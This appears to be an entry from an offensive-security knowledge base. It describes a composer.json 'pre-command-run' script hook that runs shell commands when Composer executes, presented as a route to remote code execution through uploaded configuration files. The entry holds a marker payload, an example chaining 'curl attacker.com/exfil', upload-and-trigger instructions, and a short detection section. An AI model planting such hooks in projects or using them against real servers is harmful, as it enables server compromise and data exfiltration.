---
id: 362bb409-6ceb-4b48-802a-72f49e738c9e
name: Composer-JSON-Pre-Command-Run-Hook
type: code
language: js
verified: true
created_at: '2023-04-06T03:56:41.112560+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - rce
  - composer
  - hook
validated: true
---

# Composer-JSON-Pre-Command-Run-Hook

## Code

```js
"scripts": {
    "pre-command-run" : [
    "/bin/touch /tmp/pwned.txt"
    ]
}
```

## Description

This JSON snippet adds a 'pre-command-run' hook to a Composer composer.json file. The hook executes the listed shell commands before any Composer command (e.g., 'composer install'), enabling RCE when the configuration is processed on the server.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `/bin/touch /tmp/pwned.txt` | Shell command(s) in the array; add more for chained execution | `["/bin/touch /tmp/pwned.txt", "curl attacker.com/exfil"] ` |

## Usage

Include this in a composer.json file and upload it to a vulnerable endpoint. Trigger by running 'composer install' on the server, such as in a PHP application that installs uploaded dependencies.

## Detection

- Parse composer.json for 'scripts' with 'pre-command-run' containing shell invocations (e.g., paths to /bin/ binaries).
- Log Composer executions and alert on hook runs creating files or making network connections.
- Integrate dependency scanners like Composer's own validation or external tools to flag malicious hooks.

## Related

- [[procedures/Upload-Malicious-Package-Manager-Configurations-for-RCE]]
- [[commands/composer-install]]
